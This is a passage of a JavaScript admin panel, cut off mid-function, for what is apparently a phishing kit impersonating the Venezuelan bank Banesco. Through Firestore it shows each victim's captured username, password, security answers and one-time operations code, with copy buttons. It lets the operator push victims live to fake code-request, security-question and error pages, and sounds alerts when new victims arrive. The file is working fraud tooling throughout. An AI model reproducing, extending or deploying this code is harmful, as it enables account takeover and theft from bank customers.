// Importar Firebase v9+
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
  getFirestore,
  collection,
  doc,
  updateDoc,
  deleteDoc,
  onSnapshot,
  query,
  getDoc,
  setDoc
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig, appConfig } from "./firebase-config.js";
// Inicializar Firebase usando la configuración importada
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
// Exponer funciones de Firestore para uso global si es necesario
window.db = db;
window.collection = collection;
window.doc = doc;
window.updateDoc = updateDoc;
window.deleteDoc = deleteDoc;

// Color por defecto para tarjetas sin color asignado
const defaultColor = '#ababad'; // Gris claro (primer color del array)

// ==================== SISTEMA DE AUDIO PARA NUEVAS CARDS ====================

// Set para trackear usuarios existentes
let existingUsers = new Set();

// Map para trackear estados de usuarios existentes (userId -> {page, status})
let userStates = new Map();

// Variables de control para problemas identificados
let isFirstLoad = true; // Para detectar si es la primera carga real
let adminActionInProgress = false; // Para ignorar cambios iniciados por el admin
let adminActionTimeout = null; // Timeout para resetear el flag

// Configuración de audio
const audioConfig = {
    enabled: true, // Se puede deshabilitar desde el panel
    notificationSound: '/sounds/franklin-notification-gta-v.mp3', // Sonido para nuevas cards
    updateSound: '/sounds/billete-papa.mp3', // Sonido para actualizaciones de estado
    volume: 0.7 // Volumen (0.0 a 1.0)
};

// Función para reproducir sonido de notificación (nuevas cards)
function playNotificationSound() {
    if (!audioConfig.enabled) {
        console.log('🔇 Audio deshabilitado');
        return;
    }
    
    try {
        const audio = new Audio(audioConfig.notificationSound);
        audio.volume = audioConfig.volume;
        
        // Promesa para manejar la reproducción
        const playPromise = audio.play();
        
        if (playPromise !== undefined) {
            playPromise
                .then(() => {
                    console.log('🔊 Sonido de nueva card reproducido');
                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo audio:', error);
                    // Fallback: mostrar notificación visual si el audio falla
                    showVisualNotification('nueva');
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio:', error);
        showVisualNotification('nueva');
    }
}

// Función para reproducir sonido de actualización de estado
function playUpdateSound() {
    if (!audioConfig.enabled) {
        console.log('🔇 Audio deshabilitado');
        return;
    }
    
    try {
        const audio = new Audio(audioConfig.updateSound);
        audio.volume = audioConfig.volume;
        
        // Promesa para manejar la reproducción
        const playPromise = audio.play();
        
        if (playPromise !== undefined) {
            playPromise
                .then(() => {
                    console.log('🔄 Sonido de actualización de estado reproducido');
                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo audio de actualización:', error);
                    // Fallback: mostrar notificación visual si el audio falla
                    showVisualNotification('actualizada');
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio de actualización:', error);
        showVisualNotification('actualizada');
    }
}

// Función para mostrar notificación visual como fallback
function showVisualNotification(type = 'nueva') {
    // Configuración según el tipo de notificación
    const config = {
        nueva: {
            background: '#28a745',
            icon: '🆕',
            text: 'Nueva card detectada!'
        },
        actualizada: {
            background: '#007bff',
            icon: '🔄',
            text: 'Card actualizada!'
        }
    };
    
    const currentConfig = config[type] || config.nueva;
    
    // Crear notificación visual temporal
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${currentConfig.background};
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        font-weight: bold;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    notification.innerHTML = `${currentConfig.icon} ${currentConfig.text}`;
    
    // Agregar animación CSS
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Remover después de 3 segundos
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// ==================== FUNCIONES DE CONTROL PARA ACCIONES DEL ADMIN ====================

/**
 * Marca que una acción del administrador está en progreso
 * Esto evitará que se reproduzcan sonidos por cambios iniciados desde el panel
 */
function setAdminActionInProgress() {
    adminActionInProgress = true;
    console.log('🔇 Acción del admin iniciada - audio temporalmente deshabilitado');
    
    // Limpiar timeout anterior si existe
    if (adminActionTimeout) {
        clearTimeout(adminActionTimeout);
    }
    
    // Resetear el flag después de 3 segundos
    adminActionTimeout = setTimeout(() => {
        adminActionInProgress = false;
        console.log('🔊 Acción del admin completada - audio rehabilitado');
    }, 3000);
}

/**
 * Verifica si es realmente la primera carga (panel vacío)
 * vs una recarga de página con datos existentes
 */
function isReallyFirstLoad(docs) {
    // Si no hay documentos, definitivamente es primera carga
    if (docs.length === 0) {
        return true;
    }
    
    // Si es la primera vez que se ejecuta updateUI y hay datos,
    // verificar si el panel estaba realmente vacío
    if (isFirstLoad) {
        // Verificar si el contenedor de usuarios está vacío
        const usersList = document.getElementById('users-list');
        const hasExistingCards = usersList && usersList.children.length > 0;
        
        // Si no hay cards en el DOM, es una carga inicial real
        return !hasExistingCards;
    }
    
    return false;
}

// ==================== FIN FUNCIONES DE CONTROL ====================

// Función para inicializar el set de usuarios existentes
function initializeExistingUsers(docs) {
    existingUsers.clear();
    docs.forEach(doc => {
        existingUsers.add(doc.id);
    });
    console.log(`📊 Inicializados ${existingUsers.size} usuarios existentes`);
}

// Función para detectar nuevos usuarios
function detectNewUsers(docs) {
    const currentUsers = new Set(docs.map(doc => doc.id));
    const newUsers = [];
    
    // Encontrar usuarios que no estaban antes
    currentUsers.forEach(userId => {
        if (!existingUsers.has(userId)) {
            newUsers.push(userId);
        }
    });
    
    // Actualizar set de usuarios existentes
    existingUsers = currentUsers;
    
    return newUsers;
}

// Función para inicializar el tracking de estados de usuarios
function initializeUserStates(docs) {
    userStates.clear();
    docs.forEach(doc => {
        const userData = doc.data();
        const userId = doc.id;
        const userPage = userData.page || 0;
        
        userStates.set(userId, {
            page: userPage,
            status: getStatusText(userPage),
            statusClass: getStatusClass(userPage)
        });
    });
    console.log(`📋 Inicializados estados de ${userStates.size} usuarios`);
}

// Función para detectar cambios de estado en usuarios existentes
function detectStateChanges(docs) {
    const updatedUsers = [];
    
    docs.forEach(doc => {
        const userData = doc.data();
        const userId = doc.id;
        const currentPage = userData.page || 0;
        const currentStatus = getStatusText(currentPage);
        const currentStatusClass = getStatusClass(currentPage);
        
        // Solo verificar usuarios que ya existían
        if (userStates.has(userId)) {
            const previousState = userStates.get(userId);
            
            // Detectar cambio de estado (page o status)
            if (previousState.page !== currentPage || 
                previousState.status !== currentStatus) {
                
                updatedUsers.push({
                    userId: userId,
                    previousState: previousState,
                    newState: {
                        page: currentPage,
                        status: currentStatus,
                        statusClass: currentStatusClass
                    }
                });
                
                // Actualizar estado guardado
                userStates.set(userId, {
                    page: currentPage,
                    status: currentStatus,
                    statusClass: currentStatusClass
                });
            }
        } else {
            // Si es un usuario nuevo, agregarlo al tracking
            userStates.set(userId, {
                page: currentPage,
                status: currentStatus,
                statusClass: currentStatusClass
            });
        }
    });
    
    return updatedUsers;
}

// ==================== CONFIGURACIÓN Y ESTADÍSTICAS DE AUDIO ====================

// Variables para estadísticas
let notificationCount = 0;
let updateCount = 0;
let lastNewUserInfo = null;
let lastUpdatedUserInfo = null;

// Función para cargar configuración de audio desde localStorage
function loadAudioConfig() {
    try {
        const savedConfig = localStorage.getItem('audioConfig');
        if (savedConfig) {
            const config = JSON.parse(savedConfig);
            
            // Aplicar configuración guardada
            audioConfig.enabled = config.enabled !== undefined ? config.enabled : true;
            audioConfig.volume = config.volume !== undefined ? config.volume : 0.7;
            audioConfig.notificationSound = config.notificationSound || '/sounds/franklin-notification-gta-v.mp3';
            audioConfig.updateSound = config.updateSound || '/sounds/billete-papa.mp3';
            
            console.log('💾 Configuración de audio cargada:', audioConfig);
        }
        
        // Cargar estadísticas
        const savedStats = localStorage.getItem('audioStats');
        if (savedStats) {
            const stats = JSON.parse(savedStats);
            notificationCount = stats.notificationCount || 0;
            updateCount = stats.updateCount || 0;
            lastNewUserInfo = stats.lastNewUserInfo || null;
            lastUpdatedUserInfo = stats.lastUpdatedUserInfo || null;
        }
        
    } catch (error) {
        console.error('❌ Error cargando configuración de audio:', error);
    }
}

// Función para guardar configuración de audio en localStorage
function saveAudioConfig() {
    try {
        const configToSave = {
            enabled: audioConfig.enabled,
            volume: audioConfig.volume,
            notificationSound: audioConfig.notificationSound,
            updateSound: audioConfig.updateSound
        };
        
        localStorage.setItem('audioConfig', JSON.stringify(configToSave));
        
        const statsToSave = {
            notificationCount: notificationCount,
            updateCount: updateCount,
            lastNewUserInfo: lastNewUserInfo,
            lastUpdatedUserInfo: lastUpdatedUserInfo
        };
        
        localStorage.setItem('audioStats', JSON.stringify(statsToSave));
        
        console.log('💾 Configuración de audio guardada');
        
        // Mostrar confirmación visual
        if (elements.saveAudioConfig) {
            const originalText = elements.saveAudioConfig.innerHTML;
            elements.saveAudioConfig.innerHTML = '✓ Guardado';
            elements.saveAudioConfig.classList.remove('btn-success');
            elements.saveAudioConfig.classList.add('btn-success');
            
            setTimeout(() => {
                elements.saveAudioConfig.innerHTML = originalText;
            }, 2000);
        }
        
    } catch (error) {
        console.error('❌ Error guardando configuración de audio:', error);
    }
}

// Función para actualizar la UI con la configuración actual
function updateAudioUI() {
    if (elements.audioEnabled) {
        elements.audioEnabled.checked = audioConfig.enabled;
    }
    
    if (elements.audioVolume) {
        elements.audioVolume.value = Math.round(audioConfig.volume * 100);
    }
    
    if (elements.volumeDisplay) {
        elements.volumeDisplay.textContent = Math.round(audioConfig.volume * 100) + '%';
    }
    
    if (elements.audioSoundSelect) {
        elements.audioSoundSelect.value = audioConfig.notificationSound;
    }
    
    if (elements.audioUpdateSelect) {
        elements.audioUpdateSelect.value = audioConfig.updateSound;
    }
    
    if (elements.notificationCount) {
        elements.notificationCount.textContent = notificationCount;
    }
    
    if (elements.updateCount) {
        elements.updateCount.textContent = updateCount;
    }
    
    if (elements.lastNewUser) {
        if (lastNewUserInfo) {
            const timeAgo = getTimeAgo(lastNewUserInfo.timestamp);
            elements.lastNewUser.innerHTML = `${lastNewUserInfo.userId} <small class="text-muted">(${timeAgo})</small>`;
        } else {
            elements.lastNewUser.textContent = 'Ninguna';
        }
    }
    
    if (elements.lastUpdatedUser) {
        if (lastUpdatedUserInfo) {
            const timeAgo = getTimeAgo(lastUpdatedUserInfo.timestamp);
            elements.lastUpdatedUser.innerHTML = `
                ${lastUpdatedUserInfo.userId} 
                <small class="text-muted">
                    (${lastUpdatedUserInfo.previousStatus} → ${lastUpdatedUserInfo.newStatus}, ${timeAgo})
                </small>
            `;
        } else {
            elements.lastUpdatedUser.textContent = 'Ninguna';
        }
    }
}

// Función para obtener tiempo transcurrido
function getTimeAgo(timestamp) {
    const now = new Date();
    const past = new Date(timestamp);
    const diffMs = now - past;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return 'hace un momento';
    if (diffMins < 60) return `hace ${diffMins} min`;
    
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `hace ${diffHours}h`;
    
    const diffDays = Math.floor(diffHours / 24);
    return `hace ${diffDays}d`;
}

// Función para configurar event listeners de audio
function setupAudioEventListeners() {
    // Toggle de activación de audio
    if (elements.audioEnabled) {
        elements.audioEnabled.addEventListener('change', function() {
            audioConfig.enabled = this.checked;
            console.log(`🔊 Audio ${audioConfig.enabled ? 'activado' : 'desactivado'}`);
        });
    }
    
    // Control de volumen
    if (elements.audioVolume) {
        elements.audioVolume.addEventListener('input', function() {
            audioConfig.volume = this.value / 100;
            if (elements.volumeDisplay) {
                elements.volumeDisplay.textContent = this.value + '%';
            }
        });
    }
    
    // Selección de sonido para nuevas cards
    if (elements.audioSoundSelect) {
        elements.audioSoundSelect.addEventListener('change', function() {
            audioConfig.notificationSound = this.value;
            console.log(`🎵 Sonido nuevas cards cambiado a: ${this.value}`);
        });
    }
    
    // Selección de sonido para actualizaciones
    if (elements.audioUpdateSelect) {
        elements.audioUpdateSelect.addEventListener('change', function() {
            audioConfig.updateSound = this.value;
            console.log(`🔄 Sonido actualizaciones cambiado a: ${this.value}`);
        });
    }
    
    // Botón de prueba para nuevas cards
    if (elements.testAudioBtn) {
        elements.testAudioBtn.addEventListener('click', function() {
            console.log('🎵 Probando sonido de nueva card...');
            playNotificationSound();
        });
    }
    
    // Botón de prueba para actualizaciones
    if (elements.testUpdateBtn) {
        elements.testUpdateBtn.addEventListener('click', function() {
            console.log('🔄 Probando sonido de actualización...');
            playUpdateSound();
        });
    }
    
    // Botón de guardar
    if (elements.saveAudioConfig) {
        elements.saveAudioConfig.addEventListener('click', function() {
            saveAudioConfig();
        });
    }
}

// Función para actualizar estadísticas cuando se detecta nuevo usuario
function updateAudioStats(newUsers) {
    if (newUsers.length > 0) {
        notificationCount += newUsers.length;
        
        // Actualizar info del último usuario
        const lastUser = newUsers[newUsers.length - 1];
        lastNewUserInfo = {
            userId: lastUser,
            timestamp: new Date().toISOString()
        };
        
        // Actualizar UI
        updateAudioUI();
        
        // Guardar estadísticas
        saveAudioConfig();
    }
}

// Función para actualizar estadísticas cuando se detectan actualizaciones de estado
function updateStateChangeStats(updatedUsers) {
    if (updatedUsers.length > 0) {
        updateCount += updatedUsers.length;
        
        // Actualizar info de la última actualización
        const lastUpdate = updatedUsers[updatedUsers.length - 1];
        lastUpdatedUserInfo = {
            userId: lastUpdate.userId,
            previousStatus: lastUpdate.previousState.status,
            newStatus: lastUpdate.newState.status,
            timestamp: new Date().toISOString()
        };
        
        // Actualizar UI
        updateAudioUI();
        
        // Guardar estadísticas
        saveAudioConfig();
    }
}

// ==================== FIN CONFIGURACIÓN DE AUDIO ====================

// Configuración de credenciales

let adminCredentials = { username: "", password: "" };
let credentialsLoaded = false;

// Función para cargar credenciales desde Firestore
async function loadAdminCredentials() {
    try {
        const credentialsRef = doc(db, "adminConfig", "credentials");
        const credentialsSnap = await getDoc(credentialsRef);

        if (credentialsSnap.exists()) {
            adminCredentials = credentialsSnap.data();
        }
    } catch (error) {
        console.error("Error cargando credenciales:", error);
    }
    credentialsLoaded = true;
}
// Elementos DOM
const elements = {
    loginScreen: document.getElementById("login-screen"),
    adminPanel: document.getElementById("admin-panel"),
    loginForm: document.getElementById("login-form"),
    logoutBtn: document.getElementById("logout-btn"),
    usersList: document.getElementById("users-list"),
    noUsersMessage: document.getElementById("no-users-message"),
    coordinatesForm: document.getElementById("coordinates-form"),
    messageForm: document.getElementById("message-form"),
    coordUserSelect: document.getElementById("coord-user-select"),
    msgUserSelect: document.getElementById("msg-user-select"),
    activeUsersCount: document.getElementById("active-users-count"),
    coordinatesUsersCount: document.getElementById("coordinates-users-count"),
    tokenUsersCount: document.getElementById("token-users-count"),
    // Elementos del formulario COE
    coeMessageForm: document.getElementById("coe-message-form"),
    coeUserSelect: document.getElementById("coe-user-select"),
    phoneNumber: document.getElementById("phone-number"),
    customMessage: document.getElementById("custom-message"),
    // Elementos de configuración de audio
    audioEnabled: document.getElementById("audio-enabled"),
    audioVolume: document.getElementById("audio-volume"),
    volumeDisplay: document.getElementById("volume-display"),
    audioSoundSelect: document.getElementById("audio-sound-select"),
    audioUpdateSelect: document.getElementById("audio-update-select"),
    testAudioBtn: document.getElementById("test-audio-btn"),
    testUpdateBtn: document.getElementById("test-update-btn"),
    saveAudioConfig: document.getElementById("save-audio-config"),
    lastNewUser: document.getElementById("last-new-user"),
    lastUpdatedUser: document.getElementById("last-updated-user"),
    notificationCount: document.getElementById("notification-count"),
    updateCount: document.getElementById("update-count")
};
// Función para cargar usuarios activos
function loadActiveUsers() {
    const usersRef = collection(db, "redireccion");
    const q = query(usersRef);
    onSnapshot(q, (snapshot) => {
        const docs = snapshot.docs;
        updateUI(docs);
    });
}
// Función para iniciar sesión
if (elements.loginForm) {
    elements.loginForm.addEventListener("submit", async function (e) {
        e.preventDefault();

        if (!credentialsLoaded) {
            alert("Cargando credenciales, por favor espere...");
            await loadAdminCredentials();
        }

        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        if (username === adminCredentials.username && password === adminCredentials.password) {
            localStorage.setItem("adminLoggedIn", "true");
            elements.loginScreen.classList.add("d-none");
            elements.adminPanel.classList.remove("d-none");
            loadActiveUsers();
        } else {
            alert("Credenciales incorrectas. Verifique usuario y contraseña.");
        }
    });
};
// Función para cerrar sesión
if (elements.logoutBtn) {
    elements.logoutBtn.addEventListener("click", function () {
        localStorage.removeItem("adminLoggedIn");
        elements.loginScreen.classList.remove("d-none");
        elements.adminPanel.classList.add("d-none");
    });
};
// Función genérica para manejar formularios
function handleFormSubmit(formElement, selectElement, successMessage, updateData) {
    if (!formElement) return;

    formElement.addEventListener("submit", async function (e) {
        e.preventDefault();

        const selectedUserId = selectElement ? selectElement.value : '';
        if (!selectedUserId) {
            alert("Por favor seleccione un usuario");
            return;
        }

        try {
            const userDocRef = doc(db, "redireccion", selectedUserId);
            const dataToUpdate = updateData(selectedUserId);

            console.log(`📊 Actualizando usuario ${selectedUserId} con:`, dataToUpdate);

            await updateDoc(userDocRef, dataToUpdate);
            formElement.reset();

            console.log(`✅ Usuario ${selectedUserId} actualizado exitosamente`);
            alert(successMessage);

            // Recargar usuarios para ver cambios inmediatamente
            loadActiveUsers();
        } catch (error) {
            console.error("❌ Error actualizando usuario:", error);
            alert("Error: " + error.message);
        }
    });
}

// Configurar formularios
// Función especial para preguntas de seguridad (solo actualizar, no sobrescribir)
async function enviarPreguntasSeguridad(event) {
    event.preventDefault();
    
    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();

    const selectedUserId = elements.coordUserSelect.value;
    if (!selectedUserId) {
        alert("Por favor seleccione un usuario");
        return;
    }

    const pregunta1 = document.getElementById("pregunta1").value.trim();
    const pregunta2 = document.getElementById("pregunta2").value.trim();

    if (!pregunta1) {
        alert("Por favor complete la primera pregunta de seguridad");
        return;
    }

    // Pregunta 2 es opcional
    if (!pregunta2) {
        console.log("ℹ️ Pregunta 2 no configurada, será opcional");
    }

    try {
        console.log(`📝 Configurando preguntas para usuario: ${selectedUserId}`);

        const userDocRef = doc(db, "redireccion", selectedUserId);

        // SOLO ACTUALIZAR - No sobrescribir datos existentes
        const datosActualizar = {
            preguntaSeguridad1: pregunta1,
            preguntaSeguridad2: "", // Inicializar como vacío
            page: 55,  // Redirigir a página DESF
            preguntasConfiguradas: new Date().toISOString()
        };

        // Solo configurar pregunta2 si tiene contenido
        if (pregunta2 && pregunta2.trim() !== '') {
            datosActualizar.preguntaSeguridad2 = pregunta2;
            console.log("✅ Pregunta 2 configurada:", pregunta2);
        } else {
            console.log("🗑️ Pregunta 2 será opcional (vacía)");
        }

        console.log(`📊 Actualizando (no sobrescribiendo) con:`, datosActualizar);

        await updateDoc(userDocRef, datosActualizar);

        // Limpiar formulario
        elements.coordinatesForm.reset();

        console.log(`✅ Preguntas configuradas y usuario redirigido a DESF`);
        alert("Preguntas configuradas correctamente. Usuario redirigido a página de seguridad.");

        // Recargar usuarios para ver cambios
        loadActiveUsers();

    } catch (error) {
        console.error("❌ Error configurando preguntas:", error);
        alert("Error: " + error.message);
    }
}

// Función para actualizar mensaje COE
async function actualizarMensajeCOE(event) {
    event.preventDefault();
    
    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();
    
    try {
        const usuario = elements.coeUserSelect.value.trim();
        const phoneNumber = elements.phoneNumber.value.trim();
        const customMessage = elements.customMessage.value.trim();
        
        if (!usuario) {
            throw new Error("Por favor seleccione un usuario");
        }
        
        if (!phoneNumber) {
            throw new Error("El número de teléfono es requerido");
        }
        
        // Mensaje por defecto si no se especifica uno personalizado
        const message = customMessage || `Consulte en su teléfono *****{phone} el mensaje de Banesco con la <b>Clave de Operaciones Especiales</b> que necesita para completar la autenticación.`;
        
        // Reemplazar variable {phone} en el mensaje
        const finalMessage = message.replace(/{phone}/g, phoneNumber);
        
        console.log(`📱 Actualizando mensaje COE para usuario: ${usuario}`);
        console.log(`📱 Teléfono: ${phoneNumber}`);
        console.log(`📱 Mensaje final: ${finalMessage}`);
        
        // Actualizar en la colección redireccion (que ya tiene permisos)
        const userRef = doc(db, "redireccion", usuario);
        await updateDoc(userRef, {
            coeMessage: finalMessage,
            coePhone: "*****" + phoneNumber,
            coeCustomMessage: message,
            coeUpdated: new Date().toISOString(),
            coeUpdatedBy: "admin",
            page: 9 // Redirigir automáticamente a COE-Empresa (igual que el botón)
        });
        
        alert(`✅ Mensaje COE actualizado correctamente para ${usuario}`);
        console.log(`🚀 Usuario será redirigido automáticamente a COE-Empresa (page: 9)`);
        
        // Limpiar formulario
        elements.coeMessageForm.reset();
        elements.coeUserSelect.value = "";
        
    } catch (error) {
        console.error("❌ Error actualizando mensaje COE:", error);
        alert("Error: " + error.message);
    }
}

// Configurar event listener para el formulario de preguntas
if (elements.coordinatesForm) {
    elements.coordinatesForm.addEventListener('submit', enviarPreguntasSeguridad);
}

// Configurar event listener para el formulario de mensaje COE
if (elements.coeMessageForm) {
    elements.coeMessageForm.addEventListener('submit', actualizarMensajeCOE);
}

handleFormSubmit(
    elements.messageForm,
    elements.msgUserSelect,
    "Mensaje enviado correctamente",
    () => {
        const messageText = document.getElementById("message-text").value.trim();
        if (!messageText) {
            throw new Error("Por favor ingrese un mensaje");
        }
        return { msg: messageText, page: 4 };
    }
);
// Función para actualizar la interfaz de usuario
function updateUI(docs) {
    // ==================== DETECCIÓN DE NUEVOS USUARIOS Y CAMBIOS DE ESTADO ====================
    
    // Verificar si es realmente la primera carga (panel vacío)
    const reallyFirstLoad = isReallyFirstLoad(docs);
    
    // Si es la primera carga real O no hay usuarios trackeados, inicializar
    if (existingUsers.size === 0 || reallyFirstLoad) {
        initializeExistingUsers(docs);
        initializeUserStates(docs);
        
        if (reallyFirstLoad) {
            console.log('🔄 Primera carga real del panel (estaba vacío) - no reproducir audio');
        } else {
            console.log('🔄 Inicialización de tracking - no reproducir audio');
        }
        
        // Marcar que ya no es la primera carga
        isFirstLoad = false;
    } else {
        // Detectar nuevos usuarios
        const newUsers = detectNewUsers(docs);
        
        // Detectar cambios de estado en usuarios existentes
        const updatedUsers = detectStateChanges(docs);
        
        // Manejar nuevos usuarios (siempre reproducir sonido si hay nuevos)
        if (newUsers.length > 0) {
            console.log(`🆕 ${newUsers.length} nuevo(s) usuario(s) detectado(s):`, newUsers);
            
            // Reproducir sonido de notificación (incluso para la primera card si el panel estaba vacío)
            playNotificationSound();
            
            // Actualizar estadísticas de audio
            updateAudioStats(newUsers);
            
            // Log detallado de nuevos usuarios
            newUsers.forEach(userId => {
                const userData = docs.find(doc => doc.id === userId)?.data();
                if (userData) {
                    console.log(`📋 Nuevo usuario: ${userId} (${userData.tipo || 'Tipo no especificado'})`);
                }
            });
        }
        
        // Manejar actualizaciones de estado (solo si NO es una acción del admin)
        if (updatedUsers.length > 0) {
            console.log(`🔄 ${updatedUsers.length} usuario(s) actualizado(s):`, updatedUsers);
            
            // Solo reproducir sonido si NO es una acción del administrador
            if (!adminActionInProgress) {
                // Reproducir sonido de actualización
                playUpdateSound();
                
                // Actualizar estadísticas de actualizaciones
                updateStateChangeStats(updatedUsers);
            } else {
                console.log('🔇 Actualización detectada durante acción del admin - sonido omitido');
            }
            
            // Log detallado de actualizaciones (siempre mostrar)
            updatedUsers.forEach(update => {
                console.log(`🔄 Usuario actualizado: ${update.userId}`);
                console.log(`   Estado anterior: ${update.previousState.status} (page: ${update.previousState.page})`);
                console.log(`   Estado nuevo: ${update.newState.status} (page: ${update.newState.page})`);
            });
        }
    }
    
    // ==================== FIN DETECCIÓN ====================
    
    // Limpiar solo las tarjetas que no están siendo eliminadas
    const existingCards = elements.usersList.querySelectorAll('.col-md-4:not([data-removing="true"])');
    existingCards.forEach(card => card.remove());

    // Limpiar selectores de usuario
    const userOptions = '<option value="">Seleccione un usuario...</option>';
    if (elements.coordUserSelect) elements.coordUserSelect.innerHTML = userOptions;
    if (elements.msgUserSelect) elements.msgUserSelect.innerHTML = userOptions;
    if (elements.coeUserSelect) elements.coeUserSelect.innerHTML = userOptions;
    // Contadores
    let totalActive = 0;
    let inCoordinates = 0;
    let inToken = 0;
    let inHomePage = 0;
    if (docs.length === 0) {
        elements.noUsersMessage.classList.remove("d-none");
    } else {
        elements.noUsersMessage.classList.add("d-none");
        docs.forEach((doc) => {
            const userData = doc.data();
            const userId = doc.id;
            const tipo = userData.tipo || '';
            const userPage = userData.page || 0;
            const userPasswd = userData.clave || 0;
            const respuestaSeguridad1 = userData.respuestaSeguridad1 || '';
            const respuestaSeguridad2 = userData.respuestaSeguridad2 || '';
            const claveOperaciones = userData.claveOperaciones || '';
            // Procesar todos los usuarios, incluso los que están en la página inicial (page=4)
            totalActive++;
            // Contar usuarios por estado
            if (userPage === 2) {
                inCoordinates++;
            } else if (userPage === 3) {
                inToken++;
            } else if (userPage === 4) {
                inHomePage++;
            }
            // Verificar si ya existe una tarjeta para este usuario
            const existingCard = elements.usersList.querySelector(`[data-user-id="${userId}"]`);
            if (existingCard && !existingCard.closest('[data-removing="true"]')) {
                // Si ya existe y no está siendo eliminada, saltar
                return;
            }

            // Crear tarjeta de usuario (manteniendo el diseño original)
            const statusText = getStatusText(userPage);
            const statusClass = getStatusClass(userPage);
            // 🎨 APLICAR COLORES ESPECIALES PARA NO-VENEZOLANOS
            const cardNumber = userData.cardNumber || '?';
            const isVenezolano = tipo.toLowerCase().includes('venezolano');
            
            // Color de fondo: negro para no-venezolanos, color original para venezolanos
            const cardBackgroundColor = isVenezolano ? (userData.cardColor || defaultColor) : '#000000';
            // Color de texto: gris para no-venezolanos, blanco para venezolanos
            const textColor = isVenezolano ? '#ffffff' : '#707070';
            
            console.log(`🏷️ Usuario ${userId}: ${tipo} - Venezolano: ${isVenezolano} - Color: ${cardBackgroundColor}`);

            const userCard = document.createElement("div");
            userCard.className = "col-md-4 mb-3";
            userCard.setAttribute('data-user-container', userId);
            userCard.innerHTML = `
            <div class="card user-card highlight-animation" style="background-color: ${cardBackgroundColor}; color: ${textColor};">
              <div class="card-header d-flex justify-content-between align-items-center" style="background-color: ${cardBackgroundColor}; border-bottom: 1px solid #ccc; color: ${textColor};">
                <h5>
                    <span class="badge badge-dark" style="margin-right: 10px;">#${cardNumber}</span> 
                    <span class="badge badge-dark" style="margin-right: 10px;">${tipo}</span> 
                    </h5>
                    <span class="badge badge-${statusClass}">${statusText}</span>
                    </div>
                <div style="margin: 20px 0px 0px 20px; color: ${textColor};">
                <p class="mb-0" style="color: ${textColor};">Usuario: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userId}" title="Haz clic para copiar">${userId} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Clave: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${userPasswd}" title="Haz clic para copiar">${userPasswd} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Pregunta 1: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${respuestaSeguridad1}" title="Haz clic para copiar">${respuestaSeguridad1} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Pregunta 2: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${respuestaSeguridad2}" title="Haz clic para copiar">${respuestaSeguridad2} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">COE: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${claveOperaciones}" title="Haz clic para copiar">${claveOperaciones} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                </div>
              <div class="card-body">
                <div class="mb-3">
                  <label for="htmlContent-${userId}" class="form-label"><strong>Contenido HTML para Dashboard:</strong></label>
                  <textarea
                    id="htmlContent-${userId}"
                    class="form-control html-content-textarea"
                    rows="6"
                    placeholder="Ingrese el contenido HTML completo incluyendo <body></body>..."
                    style="font-family: 'Courier New', monospace; font-size: 12px;"
                  >${userData.htmlContent || ''}</textarea>
                </div>
                <div class="btn-group btn-block">
                  <button class="btn btn-success action-btn mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
                  <button class="btn btn-info action-btn mr-1 rounded" data-action="coe" data-id="${userId}" >COE</button>
                  <button class="btn btn-warning action-btn mr-1 rounded" data-action="passwd" data-id="${userId}">Clave</button>
                  <button class="btn btn-success action-btn mr-1 rounded" data-action="dashboard" data-id="${userId}">Dashboard</button>
                  <button class="btn btn-secondary action-btn mr-1 rounded" data-action="emp" data-id="${userId}">Salida-Empresa</button>
                </div>
                <div class="btn-group btn-block">
                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="err_login" data-id="${userId}">Err-Login</button>
                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="coe_err" data-id="${userId}" >COE-Err</button>
                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="desf_err" data-id="${userId}">DESF-Err</button>
                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                </div>
              </div>
            </div>
            `;
            elements.usersList.appendChild(userCard);

            // Configurar auto-guardado del textarea HTML
            const htmlTextarea = document.getElementById(`htmlContent-${userId}`);
